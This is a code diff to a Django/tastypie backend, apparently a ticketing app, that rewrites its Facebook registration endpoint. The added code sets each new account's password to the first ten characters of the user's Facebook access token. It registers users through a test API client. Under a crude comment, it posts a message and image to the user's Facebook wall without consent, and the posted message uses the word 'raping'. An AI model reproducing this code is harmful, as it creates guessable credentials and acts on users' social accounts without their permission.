@@ -45,6 +45,9 @@ from tastypie import http
 from tastypie.exceptions import ImmediateHttpResponse
 from kombu.transport.django.managers import select_for_update
 from django.db import transaction
+from ticketz_backend_app import facebook
+from tastypie.test import TestApiClient
+
 
 
 #===============================================================================
@@ -1042,13 +1045,11 @@ class UtilitiesResource(NerdeezResource):
         '''
         #get the params
         post = simplejson.loads(request.body)
-        uuid = post.get('uuid')
+        uuid = post.get('uuid', None)
         first_name = post.get('first_name', '')
         last_name = post.get('last_name', '')
         email = post.get('email')
         password = post.get('password')
-        facebook_user_id = post.get('facebook_user_id', None)
-        facebook_access_token = post.get('facebook_access_token', None)
         
         #check for duplicates for uuid and email
         if PhoneProfile.objects.filter(uuid=uuid).count() > 0 or User.objects.filter(email=email).count() > 0:
@@ -1067,8 +1068,6 @@ class UtilitiesResource(NerdeezResource):
             phone_profile = PhoneProfile()
             phone_profile.uuid = uuid
             phone_profile.user_profile = user_profile
-            phone_profile.facebook_access_token = facebook_access_token
-            phone_profile.facebook_user_id = facebook_user_id
             phone_profile.save()
         else:
             return self.create_response(request, {
@@ -1095,13 +1094,9 @@ class UtilitiesResource(NerdeezResource):
     def register_facebook(self, request=None, **kwargs):
         '''
         api for user facebook registration will get the following post params
-        @param uuid:
-        @param first_name: the users first name 
-        @param last_name: the users last name 
-        @param email: the users email 
         @param facebook_user_id: the users id on facebook 
         @param facebook_access_token: the users token on facebook 
-        @param password: will need something to do the registration
+        @param uuid: device uuid
         @return  
                  success - 201 if created containing the following details
                  {
@@ -1123,20 +1118,26 @@ class UtilitiesResource(NerdeezResource):
         
         #get the params
         post = simplejson.loads(request.body)
-        facebook_user_id = post.get('facebook_user_id', '')
         facebook_access_token = post.get('facebook_access_token', '')
+        
+        #get the other data from facebook
+        graph = facebook.GraphAPI(facebook_access_token)
+        profile = graph.get_object("me")
+        
+        #get the email
+        email = profile['email']
         
         #first lets check if the user exists
         user = None
         try:
-            phone_profile = PhoneProfile.objects.get(facebook_access_token=facebook_access_token, facebook_user_id=facebook_user_id)
-            user = phone_profile.user_profile.user
+            user = User.objects.get(email=email)
+            phone_profile = user.get_profile().phone_profile.all()[0]
             api_key, created = ApiKey.objects.get_or_create(user=user)
             ur = PhoneProfileResource()
             ur_bundle = ur.build_bundle(obj=phone_profile, request=request)
             return self.create_response(request, {
                         'success': True,
-                        'message': "registered a new user",
+                        'message': "sending data of existing user",
                         'api_key': api_key.key,
                         'username': user.username,
                         'phone_profile': json.loads(ur.serialize(None, ur.full_dehydrate(ur_bundle), 'application/json')),
@@ -1145,7 +1146,22 @@ class UtilitiesResource(NerdeezResource):
             pass
         
         #if we didnt find the user than we need to register him
-        return self.register_user(request)
+        first_name =  profile['first_name']       
+        last_name =  profile['last_name'] 
+        data = {
+                'first_name': first_name,
+                'last_name': last_name,
+                'email': email,
+                'password': facebook_access_token[:10],
+                }
+        api_client = TestApiClient()
+        resp = api_client.post(uri='/api/v1/utilities/register-user/', format='json', data=data)  
+        
+        #rape the user wall
+        graph.put_object("me", "feed", message="This is me raping your wall", link="http://google.com", picture="http://sereedmedia.com/srmwp/wp-content/uploads/kitten.jpg")
+        
+        #return response
+        return self.create_response(request, resp.content, resp.status_code)
             
             
     def confirm_transaction(self, request=None, **kwargs):
